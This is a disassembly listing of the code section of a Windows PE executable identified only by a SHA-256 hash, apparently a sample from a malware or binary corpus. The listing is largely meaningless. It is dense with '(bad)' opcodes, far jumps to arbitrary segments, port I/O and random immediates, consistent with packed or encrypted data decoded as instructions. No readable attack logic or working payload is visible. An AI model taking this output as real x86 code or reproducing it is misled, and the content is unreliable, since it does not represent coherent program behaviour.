
f36688c870b92d1c46a416aa5d3419502d592e734b29df4a88f8a87459852107.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	push   es
  411001:	jmp    0x9be5:0x6cf0c0e2
  411008:	pop    es
  411009:	mov    esi,0x86468f35
  41100e:	xchg   edx,eax
  41100f:	mov    esp,0x4c2b4dff
  411014:	shl    DWORD PTR ds:0x753664ec,0xf1
  41101b:	shl    dl,cl
  41101d:	ss cwde 
  41101f:	cdq    
  411020:	stos   BYTE PTR es:[edi],al
  411021:	(bad)  
  411022:	in     al,0x40
  411024:	(bad)  
  411025:	push   es
  411026:	(bad)  
  411027:	mov    eax,0x29bba210
  41102c:	dec    ebp
  41102e:	mov    esp,0x71db1923
  411033:	mov    dl,0xb
  411035:	jmp    0x411001
  411037:	ror    BYTE PTR gs:[ebp-0x1781cf84],0x74
  41103f:	pop    esp
  411040:	mov    edi,DWORD PTR [eax]
  411042:	xchg   esi,edx
  411044:	mov    ds:0x62541131,al
  411049:	(bad)  
  41104a:	pusha  
  41104b:	scas   al,BYTE PTR es:[edi]
  41104c:	test   al,0xd3
  41104e:	fistp  WORD PTR [ebx]
  411050:	aas    
  411051:	ins    BYTE PTR es:[edi],dx
  411052:	cmp    ah,dh
  411054:	aaa    
  411055:	jns    0x4110aa
  411057:	stos   BYTE PTR es:[edi],al
  411058:	push   DWORD PTR [ebx+0x35e8f5bc]
  41105e:	test   BYTE PTR [eax],0xc6
  411061:	pop    esi
  411062:	adc    BYTE PTR [ecx],dh
  411064:	mov    ?,WORD PTR [ecx+0x32]
  411067:	push   ecx
  411068:	jl     0x41104b
  41106a:	mov    eax,0xa19b5eff
  41106f:	test   eax,0x31942ca6
  411074:	mov    dh,0xe5
  411076:	mov    ah,0x6b
  411078:	mov    ebx,0xd231b483
  41107d:	out    dx,al
  41107e:	pusha  
  41107f:	scas   al,BYTE PTR es:[edi]
  411080:	xchg   ebx,eax
  411081:	inc    edx
  411082:	sub    al,BYTE PTR [ebp+0x7]
  411085:	aad    0x30
  411087:	mov    dl,0x16
  411089:	iret   
  41108a:	dec    esi
  41108b:	shl    BYTE PTR [esi-0x63cce884],0xc6
  411092:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411093:	pop    edi
  411094:	jmp    0x41108b
  411096:	rol    esi,1
  411098:	cmp    al,0xea
  41109a:	jl     0x411084
  41109c:	push   eax
  41109d:	pusha  
  41109e:	imul   esp,DWORD PTR [edi-0x6d],0x6c
  4110a2:	stc    
  4110a3:	add    al,dl
  4110a5:	and    BYTE PTR [edi+0x2d7a256d],bl
  4110ab:	fsubr  st(6),st
  4110ad:	sub    DWORD PTR [edi],ebp
  4110af:	xchg   ebp,eax
  4110b0:	pop    ebp
  4110b1:	stos   DWORD PTR es:[edi],eax
  4110b2:	jp     0x4110c7
  4110b4:	es jne 0x411091
  4110b7:	retf   0xbb46
  4110ba:	sub    ah,BYTE PTR [ebx-0x2348ca64]
  4110c0:	xchg   cl,bl
  4110c2:	mov    BYTE PTR [ebx+eiz*1+0x674180c],dl
  4110c9:	imul   BYTE PTR [esi-0xd]
  4110cc:	sbb    cl,BYTE PTR [eax]
  4110ce:	jnp    0x4110b3
  4110d0:	aas    
  4110d1:	ror    dh,1
  4110d3:	ret    0xdcb7
  4110d6:	jae    0x4110b2
  4110d8:	xchg   edi,eax
  4110d9:	sar    DWORD PTR [eax],cl
  4110db:	(bad)  
  4110dc:	(bad)  
  4110dd:	imul   edx,DWORD PTR [eax+0x72],0xdc9577cc
  4110e4:	dec    esp
  4110e5:	cli    
  4110e6:	xor    bl,BYTE PTR [ecx+eax*1-0xb8e294f]
  4110ed:	lods   al,BYTE PTR ds:[esi]
  4110ee:	aad    0x7d
  4110f0:	cdq    
  4110f1:	xchg   edx,eax
  4110f2:	or     eax,DWORD PTR ds:0xf6b04b89
  4110f8:	cmp    eax,0xc783da4d
  4110fd:	sub    ah,0xce
  411100:	xchg   DWORD PTR [edi-0x11],ebp
  411103:	test   al,0x38
  411105:	lahf   
  411106:	push   esp
  411107:	sub    ebx,DWORD PTR [ecx-0x24aa1ed6]
  41110d:	sub    ah,bh
  41110f:	mov    bl,BYTE PTR [edi]
  411111:	add    dh,BYTE PTR [edx-0x7c]
  411114:	mov    BYTE PTR [edx+0xa],bh
  411117:	push   0xffffff8e
  411119:	sahf   
  41111a:	inc    ebp
  41111b:	xchg   edx,eax
  41111c:	cmc    
  41111d:	rcl    BYTE PTR [edi-0x13],1
  411120:	je     0x4111a0
  411122:	cwde   
  411123:	mov    DWORD PTR [eax+0x4c],esp
  411126:	pop    ebx
  411127:	(bad)  
  411128:	adc    al,0x7f
  41112a:	into   
  41112b:	ss cdq 
  41112d:	imul   esi,DWORD PTR [ebp+0xb],0xc47405c9
  411134:	cdq    
  411135:	aad    0x55
  411137:	js     0x4110c0
  411139:	imul   eax,DWORD PTR [esi],0xffffffae
  41113c:	and    DWORD PTR [eax-0x3d],edx
  41113f:	dec    ebp
  411140:	fisubr WORD PTR [edi]
  411142:	mul    bh
  411144:	imul   edi,DWORD PTR ds:0x31f6daf6,0x6e
  41114b:	lods   al,BYTE PTR ds:[esi]
  41114c:	out    dx,eax
  41114d:	jmp    0x50d8:0xb4c94146
  411154:	dec    ebp
  411155:	push   ebp
  411156:	imul   ecx,DWORD PTR [eax+0x79],0xfcb83203
  41115d:	jns    0x4110e9
  41115f:	arpl   WORD PTR [ebp+0x5cad183a],bx
  411165:	scas   al,BYTE PTR es:[edi]
  411166:	pop    es
  411167:	lock aas 
  411169:	lds    esp,FWORD PTR [ecx+esi*2]
  41116c:	repz xchg esp,eax
  41116e:	ja     0x4111ce
  411170:	outs   dx,BYTE PTR ds:[esi]
  411171:	mov    ebp,ebx
  411173:	mov    eax,0x874bb164
  411178:	dec    esp
  411179:	pop    edx
  41117a:	cmp    eax,0x41e7e9e4
  41117f:	fs or  ebx,esi
  411182:	clc    
  411183:	jg     0x4111ca
  411185:	ret    
  411186:	add    al,0x99
  411188:	xchg   esi,eax
  411189:	out    0x22,al
  41118b:	mov    ah,bl
  41118d:	sub    al,0xb8
  41118f:	push   eax
  411190:	fmul   st,st(1)
  411192:	(bad)  
  411193:	and    al,0x8d
  411195:	ds pop edi
  411197:	cmp    BYTE PTR [edx+ebp*8],cl
  41119a:	hlt    
  41119b:	inc    esi
  41119c:	or     al,0x1b
  41119e:	cmp    esi,DWORD PTR [edi-0x6c28d598]
  4111a4:	mov    eax,0xb87ee8a1
  4111a9:	jle    0x4111a4
  4111ab:	adc    BYTE PTR [eax+0x53c87a21],0x89
  4111b2:	pop    eax
  4111b3:	(bad)  
  4111b4:	ss sbb edi,edx
  4111b7:	sub    DWORD PTR [ecx+eiz*1-0x1c],0xc82ce006
  4111bf:	mov    dl,0xeb
  4111c1:	push   ecx
  4111c2:	and    al,0x42
  4111c4:	bound  ebp,QWORD PTR [esi]
  4111c6:	add    eax,0x4baf125a
  4111cb:	mov    ch,0x8f
  4111cd:	ins    BYTE PTR es:[edi],dx
  4111ce:	shl    DWORD PTR [eax],0xc2
  4111d1:	cmc    
  4111d2:	mov    edi,0xe1d6014a
  4111d7:	push   0x660886e8
  4111dc:	mov    ebp,DWORD PTR [ecx+ecx*8]
  4111df:	xchg   esi,eax
  4111e0:	xor    esi,0x4246adc
  4111e6:	rol    BYTE PTR [ecx+0x2e],0xaf
  4111ea:	int    0x7
  4111ec:	hlt    
  4111ed:	mov    eax,ds:0xc72d00ce
  4111f2:	xor    ecx,DWORD PTR [eax]
  4111f4:	cmp    edx,DWORD PTR [edi-0xc]
  4111f7:	fs into 
  4111f9:	sbb    edi,DWORD PTR [eax]
  4111fb:	mov    cl,0xe6
  4111fd:	cmp    eax,0x80ec38dd
  411202:	pop    esp
  411203:	and    BYTE PTR [ebp-0x217f4987],al
  411209:	test   eax,ebp
  41120b:	cwde   
  41120c:	sar    BYTE PTR [edx-0x27],1
  41120f:	(bad)  
  411210:	stos   DWORD PTR es:[edi],eax
  411211:	pop    edi
  411212:	adc    bl,al
  411214:	jne    0x411228
  411216:	cmp    DWORD PTR [edi+0x39],ecx
  411219:	jge    0x411286
  41121b:	leave  
  41121c:	xor    ebx,eax
  41121e:	sbb    DWORD PTR [ecx+0x45155697],0x2da0c017
  411228:	jns    0x411267
  41122a:	test   BYTE PTR [edx],ah
  41122c:	(bad)  
  41122d:	push   esp
  41122e:	pop    ebp
  41122f:	scas   al,BYTE PTR es:[edi]
  411230:	add    al,0x8b
  411232:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411233:	jmp    0x41126d
  411235:	popa   
  411236:	jp     0x4111f2
  411238:	xchg   esi,eax
  411239:	cmc    
  41123a:	jecxz  0x411202
  41123c:	ins    DWORD PTR es:[edi],dx
  41123d:	pop    edi
  41123e:	(bad)  
  41123f:	mov    esp,0xa3230399
  411244:	ret    
  411245:	repz add BYTE PTR [ecx+0x2c42d99a],0x9
  41124d:	jecxz  0x4111f3
  41124f:	adc    DWORD PTR [eax],esi
  411251:	dec    eax
  411252:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411253:	xor    DWORD PTR [ebx+0x7e],esp
  411256:	shl    DWORD PTR [edx-0x3a],1
  411259:	test   al,0x81
  41125b:	adc    eax,DWORD PTR [esi-0x7cffbd67]
  411261:	adc    esp,esp
  411263:	dec    ecx
  411264:	int    0xe8
  411266:	cmp    DWORD PTR [eax+0x76f0ff9],ebp
  41126c:	ror    DWORD PTR [esi+0x1a],0x6
  411270:	jnp    0x4112b2
  411272:	and    al,0x95
  411274:	lods   eax,DWORD PTR ds:[esi]
  411275:	or     eax,0xc163014e
  41127a:	mov    ebp,0xe7bde7b1
  41127f:	fstp   DWORD PTR [edi]
  411281:	aad    0x40
  411283:	out    dx,eax
  411284:	mov    gs,WORD PTR [eax+0x4d2cc6e9]
  41128a:	ins    DWORD PTR es:[edi],dx
  41128b:	retf   0x8421
  41128e:	jmp    0xdb7c6076
  411293:	cmp    eax,0x3cda8e9a
  411298:	push   eax
  411299:	mov    ah,0xcd
  41129b:	xchg   ch,ah
  41129d:	clc    
  41129e:	lds    edi,FWORD PTR [esi+ecx*2-0x7]
  4112a2:	pop    esi
  4112a3:	inc    edi
  4112a4:	les    edi,FWORD PTR [esp+ebx*2+0x4c9a17e6]
  4112ab:	fcmovu st,st(1)
  4112ad:	jbe    0x41123c
  4112af:	rol    DWORD PTR [edi],0x24
  4112b2:	add    BYTE PTR [edi-0x4ebcafe2],0xac
  4112b9:	(bad)  
  4112ba:	sahf   
  4112bb:	add    bh,BYTE PTR [eax-0x14]
  4112be:	pop    es
  4112bf:	inc    edi
  4112c0:	enter  0x7183,0x9f
  4112c4:	xor    ebp,DWORD PTR [edx-0x195b29e6]
  4112ca:	scas   eax,DWORD PTR es:[edi]
  4112cb:	xor    BYTE PTR [eax+0x17824f7b],bl
  4112d1:	into   
  4112d2:	imul   edi,ebx,0xbf1af6eb
  4112d8:	aad    0xa8
  4112da:	not    BYTE PTR [ebx]
  4112dc:	mov    ecx,0x332dc213
  4112e1:	sbb    DWORD PTR [ebp+0x50],esp
  4112e4:	sub    DWORD PTR [edx],eax
  4112e6:	clc    
  4112e7:	jecxz  0x411316
  4112e9:	rcl    BYTE PTR [ebp+0x1371c938],0x84
  4112f0:	mov    ecx,0xa74310d5
  4112f5:	push   eax
  4112f6:	sahf   
  4112f7:	adc    DWORD PTR [edx+ebp*8-0x4c0ec34],0xffffffdf
  4112ff:	push   0xc83d3821
  411304:	es loope 0x411355
  411307:	inc    edx
  411308:	(bad)  
  411309:	repz push ecx
  41130b:	inc    esi
  41130c:	sbb    eax,0x9cb2ecf3
  411311:	(bad)  
  411312:	and    eax,0xa4f84d5b
  411317:	sbb    edi,DWORD PTR [edx+0x49]
  41131a:	cdq    
  41131b:	inc    ecx
  41131c:	xchg   ch,ah
  41131e:	inc    esp
  41131f:	mov    edx,?
  411321:	fcom   DWORD PTR [edx+0x4759719]
  411327:	pop    edx
  411328:	mov    ss,WORD PTR ds:0x1fbffe8
  41132e:	das    
  41132f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411330:	popa   
  411331:	mov    bl,0x8b
  411333:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411334:	ins    DWORD PTR es:[edi],dx
  411335:	sub    DWORD PTR [edx+0x13],edi
  411338:	ret    
  411339:	les    esi,FWORD PTR [ebp+0x17]
  41133c:	js     0x411319
  41133e:	pop    ebx
  41133f:	lods   eax,DWORD PTR ds:[esi]
  411340:	sahf   
  411341:	icebp  
  411342:	and    al,0xb6
  411344:	js     0x41139c
  411346:	inc    ecx
  411347:	or     al,0x99
  411349:	test   DWORD PTR [ebx],eax
  41134b:	gs inc esi
  41134d:	call   0x6fa19084
  411352:	out    0x25,al
  411354:	push   cs
  411355:	ins    DWORD PTR es:[edi],dx
  411356:	or     eax,0xd054577d
  41135b:	test   al,0x67
  41135d:	add    DWORD PTR [ecx-0x37646e76],ebx
  411363:	sub    cl,dl
  411365:	test   al,0x11
  411367:	in     eax,dx
  411368:	mov    al,ds:0x5905fb2c
  41136d:	das    
  41136e:	test   BYTE PTR [ebx+edx*1+0x353410ed],0xec
  411376:	out    0xa4,al
  411378:	out    dx,eax
  411379:	stos   BYTE PTR es:[edi],al
  41137a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41137b:	(bad)  
  41137c:	outs   dx,BYTE PTR ds:[esi]
  41137d:	call   0x362daa45
  411382:	sub    eax,0x47e3497c
  411387:	mov    dl,0x66
  411389:	(bad)  
  41138a:	pop    edi
  41138b:	cli    
  41138c:	and    dl,bl
  41138e:	mov    WORD PTR [eax+0x49119aca],?
  411394:	xor    eax,0x31993c4e
  411399:	ds call 0xc10752f2
  41139f:	into   
  4113a0:	mov    ds:0x579c518e,al
  4113a5:	test   DWORD PTR [edx],esp
  4113a7:	push   ds
  4113a8:	inc    eax
  4113a9:	xor    eax,0x9cd6433d
  4113ae:	ins    BYTE PTR es:[edi],dx
  4113af:	cdq    
  4113b0:	inc    ebx
  4113b1:	mov    eax,ds:0x8cce16ee
  4113b6:	and    BYTE PTR [ebp-0x1e],dh
  4113b9:	inc    esi
  4113ba:	not    DWORD PTR [edx+eax*8]
  4113bd:	jmp    0xd48d:0x50afe941
  4113c4:	xlat   BYTE PTR ds:[ebx]
  4113c5:	inc    esp
  4113c6:	popa   
  4113c7:	mul    BYTE PTR [edx-0x1500c8b5]
  4113cd:	in     eax,0xb0
  4113cf:	mov    ds:0xf4c6e9c4,al
  4113d4:	xchg   edx,eax
  4113d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113d6:	pop    eax
  4113d7:	popf   
  4113d8:	sub    eax,0x664f680a
  4113dd:	lods   al,BYTE PTR ds:[esi]
  4113de:	rcl    BYTE PTR [eax-0x159cb30b],1
  4113e4:	xor    DWORD PTR [ebx+0x4eaf5bf1],ecx
  4113ea:	shl    BYTE PTR [ebx],0x8e
  4113ed:	push   edx
  4113ee:	jne    0x411424
  4113f0:	icebp  
  4113f1:	sub    ebp,DWORD PTR [ebp-0x608d89d1]
  4113f7:	add    eax,0x6f500551
  4113fc:	ficom  DWORD PTR [esi+0x30b38411]
  411402:	mov    al,0x96
  411404:	sbb    cl,BYTE PTR [esi-0x3b]
  411407:	push   edx
  411408:	daa    
  411409:	inc    edi
  41140a:	jno    0x4113f4
  41140c:	push   eax
  41140d:	out    dx,eax
  41140e:	leave  
  41140f:	cmp    eax,0x10fef2b
  411414:	iret   
  411415:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411416:	mov    DWORD PTR ds:0xf8de5134,ecx
  41141c:	pop    es
  41141d:	outs   dx,BYTE PTR ds:[esi]
  41141e:	ret    0xaa75
  411421:	test   DWORD PTR [edi],eax
  411423:	add    eax,0xbf6f1ac8
  411428:	in     eax,0xe9
  41142a:	push   ss
  41142b:	or     bl,BYTE PTR [ebp+0x35]
  41142e:	inc    esp
  41142f:	dec    ebx
  411430:	pop    ds
  411431:	outs   dx,BYTE PTR ds:[esi]
  411432:	add    al,0xfd
  411434:	ret    
  411435:	xor    DWORD PTR [edi+ebp*1+0x1cc0563b],edi
  41143c:	or     ah,BYTE PTR [eax+ebx*2]
  41143f:	loope  0x41140a
  411441:	jnp    0x411433
  411443:	cld    
  411444:	dec    esp
  411445:	ror    BYTE PTR [eax],0xc
  411448:	or     al,0x12
  41144a:	jge    0x4114a4
  41144c:	call   0xf136610f
  411451:	mov    ebx,DWORD PTR [esi]
  411453:	es fsin 
  411456:	mov    bl,0xa5
  411458:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411459:	std    
  41145a:	mov    esp,0xa73e1114
  41145f:	ret    0x74c2
  411462:	inc    ecx
  411463:	add    ebx,DWORD PTR [ebx]
  411465:	mov    ebp,0xb15c5420
  41146a:	aad    0x8c
  41146c:	ins    BYTE PTR es:[edi],dx
  41146d:	push   ebx
  41146e:	push   ds
  41146f:	cmc    
  411470:	mov    dl,bl
  411472:	stc    
  411473:	bound  eax,QWORD PTR [esi]
  411475:	ficom  DWORD PTR [edi+0x7e92c382]
  41147b:	pop    ebp
  41147c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41147d:	sub    bh,BYTE PTR [eax]
  41147f:	jno    0x411462
  411481:	dec    esp
  411482:	mov    BYTE PTR [edi+0x69308442],bl
  411488:	add    al,0x37
  41148a:	outs   dx,DWORD PTR ds:[esi]
  41148b:	mov    DWORD PTR [ecx-0x37],0x88f96a85
  411492:	push   esi
  411493:	pop    ecx
  411494:	stc    
  411495:	pop    edx
  411496:	push   ecx
  411497:	push   esp
  411498:	adc    DWORD PTR [ebx+0x39],0x99e4b91
  41149f:	jl     0x4114af
  4114a1:	sub    DWORD PTR [ecx+0x1c],edi
  4114a4:	into   
  4114a5:	jne    0x411448
  4114a7:	(bad)  
  4114a8:	and    eax,0xd4107f6a
  4114ad:	add    eax,esi
  4114af:	fdiv   QWORD PTR [esi+0x20]
  4114b2:	std    
  4114b3:	call   0x8d7e:0x7b28bce3
  4114ba:	adc    ch,al
  4114bc:	test   eax,0xc257595c
  4114c1:	adc    eax,0x3a8da4cb
  4114c6:	or     edx,DWORD PTR [edi]
  4114c8:	retf   
  4114c9:	pop    esp
  4114ca:	pop    esi
  4114cb:	mov    cl,BYTE PTR [ecx-0x24d679af]
  4114d1:	call   0x67e7:0xe7175284
  4114d8:	fxch   st(2)
  4114da:	fmul   DWORD PTR [esp+eiz*2-0x8]
  4114de:	loope  0x411471
  4114e0:	psrld  mm0,QWORD PTR [esi]
  4114e3:	ret    
  4114e4:	dec    ebx
  4114e5:	inc    ebp
  4114e6:	aad    0x3e
  4114e8:	pop    ecx
  4114e9:	in     eax,0x1e
  4114eb:	pop    ecx
  4114ec:	pop    edi
  4114ed:	neg    BYTE PTR [edx+0x428b7d28]
  4114f3:	adc    eax,0x40a5859c
  4114f8:	fcmove st,st(2)
  4114fa:	pusha  
  4114fb:	add    ebx,DWORD PTR [ecx+0x4]
  4114fe:	fs jbe 0x4114d5
  411501:	mov    bl,0xe5
  411503:	bound  esp,QWORD PTR [ecx]
  411505:	and    bh,BYTE PTR [eax+0xd]
  411508:	cmp    dh,dl
  41150a:	mov    BYTE PTR [edx+edx*1],bh
  41150d:	rol    BYTE PTR [ebx],0x29
  411510:	push   es
  411511:	pop    es
  411512:	cli    
  411513:	or     al,0x27
  411515:	inc    DWORD PTR [ebp+0x71]
  411518:	fstp   DWORD PTR [ebx]
  41151a:	jae    0x4114a5
  41151c:	xchg   ebx,eax
  41151d:	scas   eax,DWORD PTR es:[edi]
  41151e:	jbe    0x411582
  411520:	sub    BYTE PTR [edx-0x5e0a6cc6],ah
  411526:	adc    eax,0x67503e55
  41152b:	mov    edi,eax
  41152d:	test   DWORD PTR [ebp+ebp*1-0x4668c3c7],edi
  411534:	jl     0x4114ec
  411536:	or     eax,0xd8d4160c
  41153b:	mov    al,0x24
  41153d:	div    DWORD PTR [ecx+0x6df3e287]
  411543:	jge    0x411507
  411545:	(bad)  
  411546:	clc    
  411547:	out    dx,al
  411548:	inc    esi
  411549:	inc    eax
  41154a:	xor    eax,0xec76d20f
  41154f:	adc    edx,DWORD PTR [edx]
  411551:	cmp    al,0xb0
  411553:	sbb    eax,0x22066396
  411558:	mov    ch,0xa8
  41155a:	call   0x63c776fb
  41155f:	pop    ebx
  411560:	shl    DWORD PTR [esi],cl
  411562:	lods   al,BYTE PTR ds:[esi]
  411563:	mov    ch,0x59
  411565:	add    DWORD PTR [eax],0x77f6d43b
  41156b:	pop    esi
  41156c:	(bad)  
  41156d:	(bad)  
  41156e:	and    BYTE PTR [esi+edx*1-0x54660c],dh
  411575:	sbb    al,0xeb
  411577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411578:	bound  esp,QWORD PTR [esi]
  41157a:	cdq    
  41157b:	mov    al,ds:0x1f65b5f7
  411580:	fisttp WORD PTR [edi+0x25746925]
  411586:	lds    eax,FWORD PTR ss:[ebx-0x7f48b67b]
  41158d:	mov    dh,0x22
  41158f:	(bad)  
  411591:	pop    eax
  411592:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411593:	loope  0x4115f1
  411595:	mov    edi,0x3499af15
  41159a:	mov    bh,0xb2
  41159c:	dec    edi
  41159d:	sub    esi,DWORD PTR [esi-0x45]
  4115a0:	dec    ebp
  4115a1:	scas   al,BYTE PTR es:[edi]
  4115a2:	(bad)  
  4115a3:	jl     0x4115ba
  4115a5:	and    esp,DWORD PTR [edi-0x57]
  4115a8:	jno    0x411616
  4115aa:	retf   0xd200
  4115ad:	loop   0x41153c
  4115af:	into   
  4115b0:	stos   DWORD PTR es:[edi],eax
  4115b1:	add    eax,0xfec5e4fd
  4115b6:	mov    ?,WORD PTR [ebx+0x11b8e54d]
  4115bc:	(bad)  
  4115be:	test   al,0xd9
  4115c0:	inc    edx
  4115c1:	xchg   DWORD PTR [ecx+0x58],edx
  4115c4:	int3   
  4115c5:	dec    eax
  4115c6:	rol    BYTE PTR [ebx],cl
  4115c8:	mov    eax,ds:0xf50913d3
  4115cd:	stos   BYTE PTR es:[edi],al
  4115ce:	push   ebp
  4115cf:	fisub  DWORD PTR [ebx+0x3cddb0b4]
  4115d5:	addr16 ds sahf 
  4115d8:	xor    al,0x67
  4115da:	shr    dl,0xc5
  4115dd:	and    al,0xb1
  4115df:	(bad)  
  4115e0:	aad    0xcd
  4115e2:	stos   DWORD PTR es:[edi],eax
  4115e3:	test   DWORD PTR [esi+0x2424e71f],0x3c7a03d7
  4115ed:	aam    0x39
  4115ef:	aad    0x2d
  4115f1:	cmp    DWORD PTR ds:0x8ba3ab1c,ecx
  4115f7:	out    0xd0,al
  4115f9:	pop    edx
  4115fa:	adc    ebx,DWORD PTR [ebx+0x4855c358]
  411600:	lock out 0xb5,eax
  411603:	stos   BYTE PTR es:[edi],al
  411604:	xchg   DWORD PTR [edi+0x1f],esi
  411607:	cmp    ebx,DWORD PTR [ebp+0x301b0cd1]
  41160d:	repnz add bl,BYTE PTR [esi]
  411610:	outs   dx,DWORD PTR ds:[esi]
  411611:	inc    esp
  411612:	xor    ebp,edx
  411614:	test   BYTE PTR [esi-0x47],ch
  411617:	ins    BYTE PTR es:[edi],dx
  411618:	or     DWORD PTR [edx-0x2bddf8c2],edx
  41161e:	jge    0x41166a
  411620:	cmp    eax,0x96d568c2
  411625:	jp     0x411668
  411627:	test   al,0x13
  411629:	dec    ecx
  41162a:	fiadd  WORD PTR [eax-0x3bef8e1b]
  411630:	imul   edi,ebp,0x32
  411633:	push   es
  411634:	push   ebp
  411635:	pusha  
  411636:	mov    eax,ds:0xf4c19d1b
  41163b:	or     edx,0x24
  41163e:	pushf  
  41163f:	inc    ebx
  411640:	and    ah,bl
  411642:	scas   eax,DWORD PTR es:[edi]
  411643:	mov    eax,ds:0xf4b2095b
  411648:	and    dl,BYTE PTR [ebx+eiz*8+0x60]
  41164c:	(bad)  
  41164e:	pushf  
  41164f:	pop    es
  411650:	retf   
  411651:	pop    ebx
  411652:	xchg   ebp,eax
  411653:	lahf   
  411654:	out    0xc1,eax
  411656:	xor    al,0x36
  411658:	xchg   edx,eax
  411659:	or     al,0x2
  41165b:	xor    al,0x81
  41165d:	add    eax,0x754d2b0b
  411662:	jns    0x411615
  411664:	cmp    esp,DWORD PTR [edi]
  411666:	sbb    ch,dh
  411668:	push   ss
  411669:	sub    ecx,ebx
  41166b:	push   cs
  41166c:	scas   al,BYTE PTR es:[edi]
  41166d:	jl     0x4116e4
  41166f:	mov    edx,0xd088fc40
  411674:	xor    eax,0x15a95cb3
  411679:	stc    
  41167a:	in     al,0xd6
  41167c:	xchg   ecx,eax
  41167d:	jno    0x4116d0
  41167f:	push   ecx
  411680:	mov    eax,ds:0x299fb77
  411685:	ins    BYTE PTR es:[edi],dx
  411686:	scas   eax,DWORD PTR es:[edi]
  411687:	lahf   
  411688:	jo     0x4116fb
  41168a:	xchg   ebp,eax
  41168b:	or     ebx,DWORD PTR [eax-0x30961101]
  411691:	mov    dh,0xbb
  411693:	sbb    esi,esp
  411695:	les    ecx,FWORD PTR [edi]
  411697:	mov    dh,0x31
  411699:	repz mov ecx,0xe07fd210
  41169f:	jmp    0x3257:0xd5d3e5cb
  4116a6:	push   ebp
  4116a7:	mov    ds:0xb4087d6a,al
  4116ac:	pop    es
  4116ad:	and    BYTE PTR cs:[ecx-0x11],dl
  4116b1:	dec    edi
  4116b2:	inc    eax
  4116b3:	jl     0x4116f4
  4116b5:	pop    edi
  4116b6:	mov    ebx,0x562b9a79
  4116bb:	sar    DWORD PTR ds:0xfc40dbf9,cl
  4116c1:	jmp    0x4116c7
  4116c3:	pop    ecx
  4116c4:	cmp    al,0x5b
  4116c6:	fistp  DWORD PTR [edx+0x17f78036]
  4116cc:	or     ebp,esi
  4116ce:	pop    ebp
  4116cf:	ja     0x411693
  4116d1:	std    
  4116d2:	xchg   esp,eax
  4116d3:	xchg   esp,eax
  4116d4:	mov    ecx,0x4d66981
  4116d9:	jle    0x41172a
  4116db:	das    
  4116dc:	inc    esi
  4116dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116de:	lods   al,BYTE PTR ds:[esi]
  4116df:	or     ch,ch
  4116e1:	dec    ecx
  4116e2:	mov    bh,0xa8
  4116e4:	aaa    
  4116e5:	mov    al,0x61
  4116e7:	pop    edi
  4116e8:	inc    DWORD PTR [eax]
  4116ea:	mov    bh,0x49
  4116ec:	jmp    0x4116a3
  4116ee:	mov    BYTE PTR [ebp+0x6c],ah
  4116f1:	es nop
  4116f3:	pop    ss
  4116f4:	sub    eax,0x38bf22b3
  4116f9:	jbe    0x4116f3
  4116fb:	dec    esp
  4116fc:	aas    
  4116fd:	(bad)  
  4116fe:	cmp    DWORD PTR [edx],esi
  411700:	add    bl,BYTE PTR [ebx+0x37]
  411703:	mov    dh,0x3
  411705:	mov    ecx,0xb27baa91
  41170a:	pop    ecx
  41170b:	pop    esi
  41170c:	sahf   
  41170d:	jl     0x411749
  41170f:	mov    WORD PTR [ebp+0x33873c77],cs
  411715:	clc    
  411716:	jnp    0x41169a
  411718:	and    BYTE PTR [ebx+0x677eafb6],ch
  41171e:	inc    edi
  41171f:	shl    DWORD PTR [ebx-0xcb8dfb8],cl
  411725:	mov    edx,esp
  411727:	int    0xc2
  411729:	inc    ebx
  41172a:	and    al,0xf8
  41172c:	and    eax,0x6a36adce
  411731:	cmp    edx,edx
  411733:	ins    BYTE PTR es:[edi],dx
  411734:	pop    edx
  411735:	sti    
  411736:	je     0x41176b
  411738:	lods   al,BYTE PTR ds:[esi]
  411739:	ja     0x4117a4
  41173b:	(bad)
  41173e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41173f:	popf   
  411740:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411741:	inc    edi
  411742:	out    0x27,eax
  411744:	sub    DWORD PTR [ebp+0xf],0xab232f3f
  41174b:	retf   0x57e
  41174e:	out    dx,al
  41174f:	pop    ss
  411750:	lock shr DWORD PTR ds:0x28fc9356,1
  411758:	out    dx,eax
  411759:	lock inc ebp
  41175b:	xchg   edx,eax
  41175c:	push   eax
  41175d:	push   ds
  41175e:	js     0x411745
  411760:	push   ss
  411761:	pop    ecx
  411762:	lods   eax,DWORD PTR ds:[esi]
  411763:	jno    0x411732
  411765:	sbb    ah,BYTE PTR [eax]
  411767:	xchg   edx,eax
  411768:	arpl   bp,ax
  41176a:	pushf  
  41176b:	in     al,dx
  41176c:	int3   
  41176d:	xchg   edx,eax
  41176e:	loopne 0x41176a
  411770:	cs in  eax,dx
  411772:	mov    esp,0xa111bc12
  411777:	out    0x4e,al
  411779:	daa    
  41177a:	inc    esi
  41177b:	arpl   WORD PTR [edx-0x43],ax
  41177e:	push   ss
  41177f:	repnz loope 0x4117b8
  411782:	les    esp,FWORD PTR [ecx]
  411784:	dec    edi
  411785:	push   0xb105255b
  41178a:	adc    BYTE PTR [edi-0x29aaa0b6],bh
  411790:	ss daa 
  411792:	inc    ebp
  411793:	stc    
  411794:	mov    dl,0x31
  411796:	out    dx,eax
  411797:	fmulp  st(5),st
  411799:	jae    0x411780
  41179b:	add    BYTE PTR [edi-0x6],bh
  41179e:	retf   
  41179f:	mov    bh,0xa5
  4117a1:	imul   ebp,DWORD PTR [ecx],0xffffffa3
  4117a4:	add    ebp,edx
  4117a6:	jnp    0x411764
  4117a8:	and    BYTE PTR [ebx],dl
  4117aa:	fcmovnu st,st(0)
  4117ac:	rol    BYTE PTR ss:[edi-0x28395d2e],0x9e
  4117b4:	mov    cl,0x7f
